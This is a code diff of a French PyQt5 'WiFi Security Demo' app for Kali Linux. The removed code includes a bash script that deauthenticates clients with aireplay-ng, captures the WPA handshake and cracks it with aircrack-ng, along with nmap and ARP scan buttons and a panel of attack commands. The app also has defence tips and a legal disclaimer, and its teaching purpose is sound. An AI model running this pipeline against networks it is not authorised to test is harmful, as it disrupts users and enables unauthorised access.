-                "\n"
-
-                # ETAPE 4
-                'echo ""\n'
-                'echo "=== ETAPE 4/5 : Deauthentification (force handshake) ==="\n'
-                f'echo "  sudo aireplay-ng -0 5 -a {bssid} wlan0mon"\n'
-                'echo ""\n'
-                'sudo aireplay-ng -0 5 -a "$BSSID" "$IFACE" 2>&1 || echo "aireplay-ng indisponible -- attente passive"\n'
-                'WAITED=0\n'
-                'HS_FOUND=0\n'
-                'echo ""\n'
-                'echo "  En attente du handshake [WPA handshake: ...]..."\n'
-                'while kill -0 $DUMP_PID 2>/dev/null && [ $WAITED -lt 80 ]; do\n'
-                '  CAP_TMP=$(ls -t "${CAP_OUT}"-*.cap 2>/dev/null | head -1)\n'
-                '  if [ -n "$CAP_TMP" ]; then\n'
-                '    HS=$(aircrack-ng "$CAP_TMP" 2>&1 | grep -i "WPA handshake")\n'
-                '    if [ -n "$HS" ]; then\n'
-                '      echo ""\n'
-                '      echo "OK [WPA handshake capture] apres ${WAITED}s !"\n'
-                '      echo "  $HS"\n'
-                '      HS_FOUND=1\n'
-                '      sudo kill $DUMP_PID 2>/dev/null || true\n'
-                '      break\n'
-                '    fi\n'
-                '  fi\n'
-                '  sleep 3\n'
-                '  WAITED=$((WAITED+3))\n'
-                '  echo "  attente ${WAITED}s..."\n'
-                '  if [ $((WAITED % 15)) -eq 0 ]; then\n'
-                '    sudo aireplay-ng -0 5 -a "$BSSID" "$IFACE" 2>&1 | grep -v "^$" || true\n'
-                '  fi\n'
-                'done\n'
-                'wait $DUMP_PID 2>/dev/null || true\n'
-                "\n"
-
-                # ETAPE 5
-                'echo ""\n'
-                'echo "=== ETAPE 5/5 : Crack dictionnaire (aircrack-ng) ==="\n'
-                'CAP=$(ls -t "${CAP_OUT}"-*.cap 2>/dev/null | head -1)\n'
-                'if [ -z "$CAP" ]; then\n'
-                '  echo "ERREUR : aucun fichier .cap cree"\n'
-                '  echo "  -> Verifiez wlan0mon actif et un client connecte au reseau"\n'
-                '  exit 1\n'
-                'fi\n'
-                'echo "  Fichier    : $CAP"\n'
-                f'echo "  Commande   : aircrack-ng -w {wl} -b {bssid} $CAP"\n'
-                'echo ""\n'
-                'if [ "$HS_FOUND" = "0" ]; then\n'
-                '  echo "Aucun handshake confirme -- tentative quand meme..."\n'
-                '  echo ""\n'
-                'fi\n'
-                f'aircrack-ng -w "{wl}" -b "$BSSID" "$CAP" 2>&1\n'
-                'echo ""\n'
-                'echo "-----------------------------------"\n'
-                'echo "FIN DEMONSTRATION"\n'
-                'echo "KEY FOUND    -> MDP faible, changez-le !"\n'
-                'echo "KEY NOT FOUND -> MDP robuste ou WPA3."\n'
-                'echo "-----------------------------------"\n'
-                'echo ""\n'
-
-                # Restauration NM
-                'echo "Restauration NetworkManager..."\n'
-                'sudo airmon-ng stop wlan0mon 2>&1 | grep -v "^$" || true\n'
-                'sudo systemctl restart NetworkManager 2>&1\n'
-                'sleep 2\n'
-                'echo "OK NetworkManager restaure"\n'
-            )
-
-        # Ecrire le script dans un fichier temporaire et l'executer
-        tmp = tempfile.NamedTemporaryFile(
-            mode="w", suffix=".sh", delete=False,
-            dir="/tmp", prefix="wifi_demo_")
-        tmp.write(script)
-        tmp.flush(); tmp.close()
-        os.chmod(tmp.name, 0o755)
-        self._t.run(f"bash {tmp.name} ; rm -f {tmp.name}")
-
-    def _run(self,key):
-        d=self._D.get(key,{})
-        opts={var:(self._opts[var].text().strip() or default)
-              for (lbl,var,default) in d.get("opts",[]) if var in self._opts}
-        if d.get("run_fn")=="dict":
-            self._run_dict(opts); return
-        fn=d.get("cmd")
-        if fn:
-            self._t.run(fn(opts))
-
-    def _on_cap_ready(self, cap_path):
-        """Signal du Terminal — un .cap a été détecté après une commande."""
-        self._set_cap_fields(cap_path)
-
-    def set_nets(self,nets):
-        """Appelé par MainWin quand un scan retourne des réseaux."""
-        self._nets=nets
-        prev=self._net_combo.currentIndex()
-        self._net_combo.blockSignals(True)
-        self._net_combo.clear()
-        self._net_combo.addItem("— Sélectionner le réseau cible —")
-        for n in nets:
-            ssid  =n.get("ssid","<hidden>")
-            bssid =n.get("bssid","?")
-            sig   =n.get("signal","?")
-            sec   =n.get("security","?")
-            chan  =n.get("channel","?")
-            rate  =n.get("rate","?")
-            label=f"{ssid:<18}  {bssid}   sig:{sig}%  ch:{chan}  {rate}  {sec}"
-            self._net_combo.addItem(label)
-        self._net_combo.blockSignals(False)
-        # Restaurer sélection si possible
-        if prev>0 and prev<self._net_combo.count():
-            self._net_combo.setCurrentIndex(prev)
-        else:
-            self._net_combo.setCurrentIndex(0)
-        # Rafraîchir le champ cap après tout nouveau scan
-        self._refresh_cap_field()
-
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET APPAREILS
-# ══════════════════════════════════════════════════════════════════
-class TabDevices(QWidget):
-    def __init__(self,term:Terminal):
-        super().__init__(); self._t=term; self._macs=[]
-        lay=QVBoxLayout(self); lay.setContentsMargins(14,14,14,14); lay.setSpacing(10)
-        lay.addWidget(Lbl("Appareils sur le Réseau",WHITE,19,True))
-        lay.addWidget(Lbl("Détection ARP · Nmap · Filtre MAC",DIM,10))
-        lay.addWidget(HRule())
-        sg=QGroupBox("// SCAN RÉSEAU"); sl=QVBoxLayout(sg)
-        sr=QHBoxLayout(); sr.setSpacing(6)
-        self._sub=Inp("Sous-réseau","192.168.1.0/24")
-        ba=Btn("ARP Scan",CYAN,sm=True); bn=Btn("Nmap -sn",ORANGE,sm=True)
-        bv=Btn("Nmap -sV",PURPLE,sm=True); bh=Btn("Hosts actifs",DIM,sm=True)
-        ba.clicked.connect(lambda: self._t.run(
-            f"sudo arp-scan {self._sub.text()} 2>&1"))
-        bn.clicked.connect(lambda: self._t.run(
-            f"nmap -sn {self._sub.text()} 2>&1"))
-        bv.clicked.connect(lambda: self._t.run(
-            f"nmap -sV --open {self._sub.text()} 2>&1"))
-        bh.clicked.connect(lambda: self._t.run(
-            f"nmap -T4 -F {self._sub.text()} 2>&1"))
-        sr.addWidget(self._sub,1); sr.addWidget(ba); sr.addWidget(bn)
-        sr.addWidget(bv); sr.addWidget(bh); sl.addLayout(sr)
-        self._tbl=QTableWidget(0,4)
-        self._tbl.setHorizontalHeaderLabels(["IP","MAC","HOSTNAME","STATUT"])
-        h=self._tbl.horizontalHeader()
-        h.setSectionResizeMode(0,QHeaderView.ResizeToContents)
-        h.setSectionResizeMode(1,QHeaderView.ResizeToContents)
-        h.setSectionResizeMode(2,QHeaderView.Stretch)
-        h.setSectionResizeMode(3,QHeaderView.Fixed); self._tbl.setColumnWidth(3,90)
-        self._tbl.verticalHeader().setVisible(False)
-        self._tbl.setAlternatingRowColors(True); self._tbl.setFixedHeight(175)
-        sl.addWidget(self._tbl); lay.addWidget(sg)
-        # Filtre MAC
-        mg=QGroupBox("// FILTRE MAC"); ml=QVBoxLayout(mg)
-        mr=QHBoxLayout(); mr.setSpacing(6)
-        self._mac_in=Inp("AA:BB:CC:DD:EE:FF"); self._mac_dc=Inp("Description")
-        ba2=Btn("+ Ajouter",GREEN,sm=True); ba2.clicked.connect(self._add_mac)
-        mr.addWidget(self._mac_in); mr.addWidget(self._mac_dc,1); mr.addWidget(ba2)
-        ml.addLayout(mr)
-        self._mac_tbl=QTableWidget(0,3)
-        self._mac_tbl.setHorizontalHeaderLabels(["MAC","DESCRIPTION","ACTION"])
-        h2=self._mac_tbl.horizontalHeader()
-        h2.setSectionResizeMode(0,QHeaderView.ResizeToContents)
-        h2.setSectionResizeMode(1,QHeaderView.Stretch)
-        h2.setSectionResizeMode(2,QHeaderView.Fixed); self._mac_tbl.setColumnWidth(2,75)
-        self._mac_tbl.verticalHeader().setVisible(False); self._mac_tbl.setFixedHeight(110)
-        ml.addWidget(self._mac_tbl); lay.addWidget(mg); lay.addStretch()
-
-    def _add_mac(self):
-        mac=self._mac_in.text().strip(); dc=self._mac_dc.text().strip()
-        if not mac: return
-        self._macs.append({"mac":mac,"dc":dc})
-        row=self._mac_tbl.rowCount(); self._mac_tbl.insertRow(row)
-        self._mac_tbl.setItem(row,0,QTableWidgetItem(mac))
-        self._mac_tbl.setItem(row,1,QTableWidgetItem(dc))
-        db=QPushButton("✕ Retirer")
-        db.setStyleSheet(
-            f"QPushButton{{background:transparent;border:1px solid {RED};color:{RED};"
-            f"padding:2px 6px;font-size:9px;border-radius:2px;}}"
-            f"QPushButton:hover{{background:{RED};color:#fff;}}")
-        db.clicked.connect(lambda _,r=row: self._mac_tbl.removeRow(r))
-        self._mac_tbl.setCellWidget(row,2,db)
-        self._mac_in.clear(); self._mac_dc.clear()
-
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET VULNÉRABILITÉS
-# ══════════════════════════════════════════════════════════════════
-class TabVulns(QScrollArea):
-    def __init__(self,term:Terminal):
-        super().__init__(); self._t=term
-        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
-        self._w=QWidget(); self._lay=QVBoxLayout(self._w)
-        self._lay.setContentsMargins(14,14,14,14); self._lay.setSpacing(8)
-        self._lay.addWidget(Lbl("Vulnérabilités Détectées",WHITE,19,True))
-        self._lay.addWidget(Lbl("Analyse automatique des failles WiFi",DIM,10))
-        self._lay.addWidget(HRule())
-        # Bouton analyser
-        row=QHBoxLayout()
-        ba=Btn("🔍 Analyser les réseaux scannés",CYAN)
-        bwps=Btn("📶 Scanner WPS",ORANGE,sm=True)
-        ba.clicked.connect(self._analyze)
-        bwps.clicked.connect(lambda: self._t.run(
-            "sudo wash -i wlan0mon --ignore-fcs 2>&1"))
-        row.addWidget(ba); row.addWidget(bwps); row.addStretch()
-        self._lay.addLayout(row)
-        self._lay.addWidget(TipW(
-            "Scannez d'abord les réseaux (Vue d'ensemble → ▶ Scanner WiFi) "
-            "puis cliquez Analyser.","info"))
-        self._start=self._lay.count(); self._nets=[]
-        self._lay.addStretch(); self.setWidget(self._w)
-
-    def set_nets(self,nets): self._nets=nets
-
-    def _analyze(self):
-        while self._lay.count()>self._start:
-            it=self._lay.takeAt(self._start)
-            if it.widget(): it.widget().deleteLater()
-        vulns=[]
-        for n in self._nets:
-            s=(n.get("security","") or "").lower()
-            if not s or "open" in s:
-                vulns.append(("CRITICAL",f"Réseau ouvert: {n.get('ssid','?')}",
-                    "Aucune auth. Tout le monde peut connecter et intercepter."))
-            if "wep" in s:
-                vulns.append(("CRITICAL",f"WEP: {n.get('ssid','?')}",
-                    "WEP cassé depuis 2001. Cracké en moins de 5 minutes."))
-            if "wpa" in s and "wpa2" not in s and "wpa3" not in s:
-                vulns.append(("HIGH",f"WPA1: {n.get('ssid','?')}",
-                    "WPA1/TKIP vulnérable. Migrer vers WPA2-AES ou WPA3."))
-        vulns+=[
-            ("HIGH","WPS potentiellement actif",
-             "Activé par défaut. Cracké en quelques heures max."),
-            ("MEDIUM","SSID broadcast actif",
-             "Masquer le SSID réduit la visibilité."),
-            ("LOW","Réseau invité absent",
-             "IoT et visiteurs devraient être sur un réseau séparé."),
-        ]
-        SEV={"CRITICAL":(RED,"#fff"),"HIGH":(ORANGE,"#000"),
-             "MEDIUM":(YELLOW,"#000"),"LOW":(GREEN,"#000")}
-        for sev,title,desc in vulns:
-            fg,bfg=SEV.get(sev,(TEXT,BG))
-            f=QFrame()
-            f.setStyleSheet(
-                f"QFrame{{background:{fg}0a;border:1px solid {fg}44;border-radius:3px;}}")
-            fl=QHBoxLayout(f); fl.setContentsMargins(10,10,10,10); fl.setSpacing(10)
-            badge=QLabel(sev); badge.setFixedWidth(68); badge.setAlignment(Qt.AlignCenter)
-            badge.setStyleSheet(
-                f"background:{fg};color:{bfg};padding:3px 5px;border-radius:2px;"
-                f"font-size:9px;font-weight:bold;border:none;")
-            inf=QVBoxLayout()
-            inf.addWidget(Lbl(title,WHITE,11,True))
-            inf.addWidget(Lbl(desc,DIM,10))
-            fl.addWidget(badge); fl.addLayout(inf,1)
-            self._lay.addWidget(f)
-        self._lay.addStretch()
-
-# ══════════════════════════════════════════════════════════════════
-#  ONGLET DÉFENSE
-# ══════════════════════════════════════════════════════════════════
-class TabDefense(QScrollArea):
-    def __init__(self):
-        super().__init__()
-        self.setWidgetResizable(True); self.setStyleSheet("border:none;background:transparent;")
-        w=QWidget(); lay=QVBoxLayout(w)
-        lay.setContentsMargins(14,14,14,14); lay.setSpacing(8)
-        lay.addWidget(Lbl("Défense & Bonnes Pratiques",WHITE,19,True))
-        lay.addWidget(Lbl("Guide complet de sécurisation WiFi",DIM,10))
-        lay.addWidget(HRule())
-        for k,t in [
-            ("success","<b>✅ WPA3 ou WPA2-AES :</b> Toujours le plus récent. WEP et WPA1 sont cassés."),
-            ("success","<b>✅ MDP 16+ chars :</b> Maj + min + chiffres + symboles.<br>Ex: <code style='color:#00d4ff'>Kh@9#mR!2xL$vP5q</code>"),
-            ("warn",   "<b>⚠ Désactiver WPS :</b> Cracké en quelques heures même avec MDP fort."),
-            ("warn",   "<b>⚠ SSID neutre :</b> \"Livebox-XXXX\" révèle le modèle et ses failles."),
-            ("warn",   "<b>⚠ Réseau invité :</b> Séparer IoT et visiteurs du réseau principal."),
-            ("danger", "<b>🚫 Jamais :</b> WEP, WPA1, <code>password</code>, <code>12345678</code>, dates."),
-        ]: lay.addWidget(TipW(t,k))
-        lay.addWidget(HRule())
-        # Générateur
-        gg=QGroupBox("// GÉNÉRATEUR MOT DE PASSE FORT"); gl=QVBoxLayout(gg)
-        r1=QHBoxLayout(); r1.setSpacing(8)
-        self._len=QSpinBox(); self._len.setRange(8,64); self._len.setValue(20)
-        self._len.setSuffix(" chars")
-        bg=Btn("🎲 Générer",CYAN); bc=Btn("📋 Copier",GREEN,sm=True)
-        bg.clicked.connect(self._gen); bc.clicked.connect(self._copy)
-        r1.addWidget(Lbl("Longueur:",DIM,10)); r1.addWidget(self._len)
-        r1.addWidget(bg); r1.addWidget(bc); r1.addStretch()
-        gl.addLayout(r1)
-        self._pwd=QLineEdit(); self._pwd.setReadOnly(True)
-        self._pwd.setText("Cliquez Générer →")
-        self._pwd.setStyleSheet(f"""
-            QLineEdit{{background:{BG};border:1px solid {B2};color:{CYAN};
-              padding:14px;font-size:16px;letter-spacing:3px;border-radius:3px;}}""")
-        gl.addWidget(self._pwd)
-        self._str=Lbl("",DIM,10); gl.addWidget(self._str)
-        lay.addWidget(gg)
-        # Checklist
-        cg=QGroupBox("// CHECKLIST SÉCURITÉ"); cl=QVBoxLayout(cg)
-        for ok,txt in [
-            (True, "Utiliser WPA3 si disponible, sinon WPA2-AES"),
-            (True, "Mot de passe ≥ 16 chars, complexe et unique"),
-            (False,"Désactiver WPS dans l'interface admin du routeur"),
-            (True, "SSID neutre — ne révèle pas le modèle"),
-            (True, "Réseau invité séparé pour IoT et visiteurs"),
-            (False,"Activer le filtrage MAC si possible"),
-            (True, "Mettre à jour le firmware du routeur"),
-        ]:
-            r=QHBoxLayout(); r.setSpacing(8)
-            r.addWidget(Lbl("✅" if ok else "❌",TEXT,13))
-            r.addWidget(Lbl(txt,TEXT if ok else DIM,11),1)
-            cl.addLayout(r)
-        lay.addWidget(cg); lay.addStretch(); self.setWidget(w)
-
-    def _gen(self):
-        n=self._len.value()
-        chars=string.ascii_letters+string.digits+"!@#$%^&*()-_=+[]{}|;:,.<>?"
-        pwd="".join(secrets.choice(chars) for _ in range(n))
-        self._pwd.setText(pwd)
-        ent=math.log2(len(chars)**n)
-        y=(2**ent)/(5e5*86400*365)
-        st=("FAIBLE" if n<10 else "MOYEN" if n<14 else "FORT" if n<18 else "TRÈS FORT")
-        col={"FAIBLE":RED,"MOYEN":ORANGE,"FORT":YELLOW,"TRÈS FORT":GREEN}[st]
-        yr=">10²⁰ ans" if y>1e20 else f"{y:.2e} ans"
-        self._str.setText(f"  {st}  ·  {ent:.0f} bits  ·  Brute force GPU: ~{yr}")
-        self._str.setStyleSheet(
-            f"color:{col};font-size:10px;background:transparent;")
-
-    def _copy(self):
-        QApplication.clipboard().setText(self._pwd.text())
-
-# ══════════════════════════════════════════════════════════════════
-#  SIDEBAR
-# ══════════════════════════════════════════════════════════════════
-class Sidebar(QWidget):
-    goto=pyqtSignal(int)
-    NAV=[(0,"📊","Vue d'ensemble"),(1,"⌨ ","Terminal Linux"),
-         (2,"🔓","Phase 1 — Vulnérable"),(3,"🔒","Phase 2 — Sécurisé"),
-         (4,"⚔ ","Méthodes d'Attaque"),(5,"📡","Appareils Réseau"),
-         (6,"🐛","Vulnérabilités"),(7,"🛡 ","Défense & Conseils")]
+# ==================== ONGLET SCANNER ====================
+class TabScanner(QWidget):
+    networks_updated = pyqtSignal(list)   # émis quand réseaux disponibles
 
     def __init__(self):
         super().__init__()
-        self.setFixedWidth(208)
-        self.setStyleSheet(
-            f"QWidget{{background:{BG1};border-right:1px solid {B1};}}")
-        lay=QVBoxLayout(self); lay.setContentsMargins(10,14,10,10); lay.setSpacing(3)
-        logo=QLabel("🔐 WiFi Security Demo")
-        logo.setStyleSheet(
-            f"font-size:13px;font-weight:bold;color:{CYAN};"
-            f"letter-spacing:1px;margin-bottom:2px;")
-        sub=QLabel("v4.0  ·  Kali Linux  ·  PyQt5")
-        sub.setStyleSheet(f"font-size:9px;color:{DIM};letter-spacing:.5px;")
-        lay.addWidget(logo); lay.addWidget(sub); lay.addWidget(self._sep())
-        self._btns=[]
-        for idx,ico,name in self.NAV:
-            b=QPushButton(f" {ico}  {name}"); b.setCheckable(True)
-            b.setStyleSheet(f"""
-                QPushButton{{background:transparent;border:1px solid transparent;
-                  color:{TEXT};text-align:left;padding:8px 10px;border-radius:3px;
-                  font-size:10px;
-                  font-family:"JetBrains Mono","Courier New",monospace;}}
-                QPushButton:hover{{background:rgba(0,212,255,.07);
-                  border-color:{B2};color:{WHITE};}}
-                QPushButton:checked{{background:rgba(0,212,255,.13);
-                  border-color:{CYAN};color:{CYAN};}}""")
-            b.clicked.connect(lambda _,i=idx: self.goto.emit(i))
-            self._btns.append(b); lay.addWidget(b)
-        self._btns[0].setChecked(True)
-        lay.addWidget(self._sep())
-        lay.addWidget(Lbl("INTERFACE WIFI",DIM,9))
-        self.iface_box=QComboBox(); self.iface_box.addItems(["wlan0","wlan0mon","wlan1"])
-        lay.addWidget(self.iface_box)
-        lay.addWidget(self._sep())
-        lay.addWidget(Lbl("SYSTÈME",DIM,9))
-        self._sys={}
-        for k in ["OS","Kernel","User"]:
-            r=QHBoxLayout(); r.setSpacing(4)
-            r.addWidget(Lbl(k+":",DIM,9))
-            v=Lbl("—",TEXT,9); self._sys[k]=v; r.addWidget(v,1); lay.addLayout(r)
-        lay.addStretch()
-        bst=QPushButton("■  TOUT ARRÊTER")
-        bst.setStyleSheet(f"""
-            QPushButton{{background:rgba(255,32,80,.1);border:1px solid {RED};
-              color:{RED};padding:9px;border-radius:3px;
-              font-size:10px;font-family:"JetBrains Mono",monospace;}}
-            QPushButton:hover{{background:rgba(255,32,80,.22);}}""")
-        bst.clicked.connect(lambda: self.goto.emit(-1)); lay.addWidget(bst)
-
-    def activate(self,idx):
-        for i,b in enumerate(self._btns): b.setChecked(i==idx)
-
-    def set_sys(self,k,v):
-        if k in self._sys: self._sys[k].setText(v)
-
-    def set_ifaces(self,lst):
-        self.iface_box.clear(); self.iface_box.addItems(lst or ["wlan0"])
-
-    def _sep(self):
-        l=QFrame(); l.setFrameShape(QFrame.HLine)
-        l.setStyleSheet(f"color:{B1};background:{B1};max-height:1px;margin:5px 0;")
-        return l
-
-# ══════════════════════════════════════════════════════════════════
-#  PANNEAU LOG
-# ══════════════════════════════════════════════════════════════════
-class LogPanel(QWidget):
-    def __init__(self):
-        super().__init__()
-        self.setFixedWidth(255)
-        self.setStyleSheet(f"background:{BG1};border-left:1px solid {B1};")
-        lay=QVBoxLayout(self); lay.setContentsMargins(8,8,8,8); lay.setSpacing(5)
-        hr=QHBoxLayout()
-        hr.addWidget(Lbl("// JOURNAL",DIM,9))
-        bc=Btn("✕",DIM,sm=True); bc.setFixedSize(22,18)
-        bc.clicked.connect(lambda: self._log.clear())
-        hr.addStretch(); hr.addWidget(bc); lay.addLayout(hr)
-        self._log=QPlainTextEdit(); self._log.setReadOnly(True)
-        self._log.setStyleSheet(f"""
-            QPlainTextEdit{{background:transparent;border:none;color:{DIM};
-              font-size:10px;
-              font-family:"JetBrains Mono","Courier New",monospace;}}""")
-        lay.addWidget(self._log,1)
-        lay.addWidget(self._sep())
-        lay.addWidget(Lbl("// COMMANDES RAPIDES",DIM,9))
-        ref=QPlainTextEdit(); ref.setReadOnly(True); ref.setMaximumHeight(180)
-        ref.setStyleSheet(f"""
-            QPlainTextEdit{{background:#010306;border:1px solid {B1};border-radius:3px;
-              color:{GREEN};font-size:9px;
-              font-family:"JetBrains Mono","Courier New",monospace;padding:7px;}}""")
-        CMDS=[("# Mode moniteur",DIM),
-              ("airmon-ng start wlan0",GREEN),
-              ("# Scan réseaux",DIM),
-              ("nmcli dev wifi list",GREEN),
-              ("# Scan passif",DIM),
-              ("airodump-ng wlan0mon",GREEN),
-              ("# Capture HS",DIM),
-              ("airodump-ng --bssid XX",GREEN),
-              ("  -c 6 -w /tmp/hs wlan0mon",GREEN),
-              ("# Déauth",DIM),
-              ("aireplay-ng --deauth 5",GREEN),
-              ("  -a XX wlan0mon",GREEN),
-              ("# Cracker",DIM),
-              ("aircrack-ng -w rockyou.txt",GREEN),
-              ("  /tmp/hs-01.cap",GREEN),
-              ("# WPS scan",DIM),
-              ("wash -i wlan0mon",GREEN),
-              ("# ARP scan",DIM),
-              ("arp-scan 192.168.1.0/24",GREEN),
-              ("# Nmap",DIM),
-              ("nmap -sn 192.168.1.0/24",GREEN),]
-        for (cmd,col) in CMDS:
-            cur=ref.textCursor(); cur.movePosition(QTextCursor.End)
-            fmt=QTextCharFormat(); fmt.setForeground(QColor(col))
-            cur.insertText(cmd+"\n",fmt)
-        lay.addWidget(ref)
-
-    def log(self,msg,kind="data"):
-        C2={"ok":GREEN,"err":RED,"warn":ORANGE,"info":CYAN,"data":TEXT}
-        now=datetime.now().strftime("%H:%M:%S")
-        cur=self._log.textCursor(); cur.movePosition(QTextCursor.End)
-        fmt=QTextCharFormat(); fmt.setForeground(QColor(C2.get(kind,TEXT)))
-        cur.insertText(f"[{now}] {msg}\n",fmt)
-        self._log.setTextCursor(cur); self._log.ensureCursorVisible()
-        if self._log.document().blockCount()>400:
-            c2=self._log.textCursor()
-            c2.movePosition(QTextCursor.Start)
-            c2.select(QTextCursor.LineUnderCursor); c2.removeSelectedText(); c2.deleteChar()
-
-    def _sep(self):
-        l=QFrame(); l.setFrameShape(QFrame.HLine)
-        l.setStyleSheet(f"color:{B1};background:{B1};max-height:1px;"); return l
-
-# ══════════════════════════════════════════════════════════════════
-#  DISCLAIMER
-# ══════════════════════════════════════════════════════════════════
-class Disclaimer(QDialog):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("⚠ Avertissement Légal")
-        self.setFixedSize(540,555)
-        self.setWindowFlags(Qt.Dialog|Qt.WindowTitleHint)
-        self.setStyleSheet(QSS+f"QDialog{{background:{PANEL};border:2px solid {RED};}}")
-        lay=QVBoxLayout(self); lay.setContentsMargins(28,28,28,28); lay.setSpacing(12)
-        t1=QLabel("⚠  AVERTISSEMENT LÉGAL")
-        t1.setStyleSheet(
-            f"font-family:'JetBrains Mono',monospace;font-size:20px;"
-            f"font-weight:bold;color:{RED};letter-spacing:1px;")
-        t2=QLabel("WIFI SECURITY DEMO  —  USAGE ÉDUCATIF UNIQUEMENT")
-        t2.setStyleSheet(f"color:{DIM};font-size:9px;letter-spacing:2px;")
-        lay.addWidget(t1); lay.addWidget(t2); lay.addWidget(HRule())
-        for ico,txt in [
-            ("🎓","Outil destiné exclusivement à la démonstration pédagogique, "
-                  "sur des réseaux dont vous êtes propriétaire."),
-            ("⚖", "Tester un réseau WiFi sans autorisation est illégal. "
-                  "Risque de poursuites pénales."),
-            ("🔒","Utilisez uniquement votre propre hotspot Android/PC "
-                  "ou un réseau de test isolé."),
-            ("📚","But: comprendre les vulnérabilités pour mieux défendre."),
-        ]:
-            f=QFrame()
-            f.setStyleSheet(
-                f"QFrame{{background:rgba(255,32,80,.05);"
-                f"border:1px solid rgba(255,32,80,.2);border-radius:3px;}}")
-            fl=QHBoxLayout(f); fl.setContentsMargins(10,9,10,9); fl.setSpacing(10)
-            ic=QLabel(ico); ic.setFixedWidth(24)
-            ic.setStyleSheet("font-size:17px;background:transparent;border:none;")
-            tx=QLabel(txt); tx.setWordWrap(True)
-            tx.setStyleSheet(
-                f"font-size:11px;color:{TEXT};background:transparent;border:none;")
-            fl.addWidget(ic); fl.addWidget(tx,1); lay.addWidget(f)
-        self._chk=QCheckBox(
-            "Je comprends — Je teste uniquement sur mon propre réseau")
-        self._chk.setStyleSheet(f"font-size:12px;color:{TEXT};")
-        self._chk.stateChanged.connect(
-            lambda s: self._ok.setEnabled(s==Qt.Checked))
-        lay.addWidget(self._chk)
-        self._ok=QPushButton("ENTRER DANS L'APPLICATION  →")
-        self._ok.setEnabled(False)
-        self._ok.setStyleSheet(f"""
-            QPushButton{{background:#3a1020;border:none;color:#6a3040;
-              padding:14px;font-family:'JetBrains Mono',monospace;
-              font-size:14px;font-weight:bold;border-radius:3px;}}
-            QPushButton:enabled{{background:{RED};color:#fff;}}
-            QPushButton:enabled:hover{{background:#ff5577;}}""")
-        self._ok.clicked.connect(self.accept); lay.addWidget(self._ok)
-
-# ══════════════════════════════════════════════════════════════════
-#  FENÊTRE PRINCIPALE
-# ══════════════════════════════════════════════════════════════════
-class MainWin(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("🔐 WiFi Security Demo  ·  v5.0  ·  Kali Linux")
-        self.setMinimumSize(1080,680); self.resize(1300,820)
-        self.setStyleSheet(QSS)
-        self._nets=[]
+        self.thread = None
+        self._nets  = []
         self._build()
-        self._toolbar_setup()
-        self._statusbar_setup()
-        self._detect_system()
 
     def _build(self):
-        root=QWidget(); self.setCentralWidget(root)
-        rl=QHBoxLayout(root); rl.setContentsMargins(0,0,0,0); rl.setSpacing(0)
-        self._side=Sidebar()
-        self._side.goto.connect(self._goto)
-        rl.addWidget(self._side)
-        self._stack=QStackedWidget()
-        self._term=Terminal()
-        self._term.notify.connect(lambda m,k: self._lp.log(m,k))
-        self._term.networks.connect(self._on_nets)
-        self._ov  =TabOverview(self._term)
-        self._p1  =TabPhase1(self._term)
-        self._p2  =TabPhase2(self._term)
-        self._atk =TabAttacks(self._term)
-        self._dev =TabDevices(self._term)
-        self._vul =TabVulns(self._term)
-        self._def =TabDefense()
-        for w in [self._ov,self._term,self._p1,self._p2,
-                  self._atk,self._dev,self._vul,self._def]:
-            self._stack.addWidget(w)
-        self._lp=LogPanel()
-        spl=QSplitter(Qt.Horizontal)
-        spl.addWidget(self._stack); spl.addWidget(self._lp)
-        spl.setStretchFactor(0,1); spl.setStretchFactor(1,0)
-        spl.setSizes([1020,255])
-        rl.addWidget(spl,1)
-        self._goto(0)
+        lay = QVBoxLayout(self)
+        lay.setContentsMargins(10, 10, 10, 10)
 
-    def _on_nets(self,nets):
-        if not nets: return
-        self._nets=nets
-        self._ov.load(nets)
-        self._vul.set_nets(nets)
-        self._atk.set_nets(nets)
-        self._lp.log(f"{len(nets)} réseaux reçus","info")
+        hdr = QLabel("SCANNER DE RÉSEAUX WIFI")
+        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['accent']};")
+        lay.addWidget(hdr)
 
-    def _toolbar_setup(self):
-        tb=self.addToolBar("nav"); tb.setMovable(False)
-        for n,i in [("📊 VUE",0),("⌨ TERMINAL",1),("🔓 PHASE1",2),
-                     ("🔒 PHASE2",3),("⚔ ATTAQUES",4),("📡 APPAREILS",5),
-                     ("🐛 VULNS",6),("🛡 DÉFENSE",7)]:
-            a=QAction(n,self); a.triggered.connect(lambda _,x=i: self._goto(x))
-            tb.addAction(a)
-        tb.addSeparator()
-        sa=QAction("■ STOP",self); sa.triggered.connect(self._term.stop)
-        tb.addAction(sa)
-        # Zoom dans toolbar aussi
-        tb.addSeparator()
-        za=QAction("A-",self); za.triggered.connect(self._term.zoom_out); tb.addAction(za)
-        zb=QAction("A+",self); zb.triggered.connect(self._term.zoom_in);  tb.addAction(zb)
+        desc = QLabel(
+            "Méthode 1 (rapide, sans coupure réseau) : nmcli — scan via NetworkManager.\n"
+            "Méthode 2 (furtif, mode moniteur) : airodump-ng — voir tous les réseaux passifs."
+        )
+        desc.setStyleSheet("color:#888; font-size:11px;")
+        desc.setWordWrap(True)
+        lay.addWidget(desc)
 
-    def _statusbar_setup(self):
-        sb=self.statusBar()
-        self._st_dot=Lbl("●",GREEN,11); sb.addWidget(self._st_dot)
-        self._st_msg=Lbl("  Prêt",DIM,10); sb.addWidget(self._st_msg)
-        self._st_t=Lbl("",DIM,10); sb.addPermanentWidget(self._st_t)
-        t=QTimer(self)
-        t.timeout.connect(lambda: self._st_t.setText(
-            datetime.now().strftime("%H:%M:%S  %d/%m/%Y")))
-        t.start(1000)
+        # Configuration
+        cfg = QGroupBox("Configuration")
+        cfg_lay = QFormLayout(cfg)
+        self.iface_edit = QLineEdit("wlan0")
+        self.time_spin  = QSpinBox()
+        self.time_spin.setRange(5, 60)
+        self.time_spin.setValue(15)
+        self.time_spin.setSuffix(" s")
+        cfg_lay.addRow("Interface :", self.iface_edit)
+        cfg_lay.addRow("Durée (airodump) :", self.time_spin)
+        lay.addWidget(cfg)
 
-    def _goto(self,idx):
-        if idx==-1:
-            self._term.stop(); self._lp.log("Arrêt d'urgence","warn"); return
-        self._stack.setCurrentIndex(idx)
-        self._side.activate(idx)
+        # Splitter terminal | tableau
+        splitter = QSplitter(Qt.Vertical)
+        splitter.setHandleWidth(6)
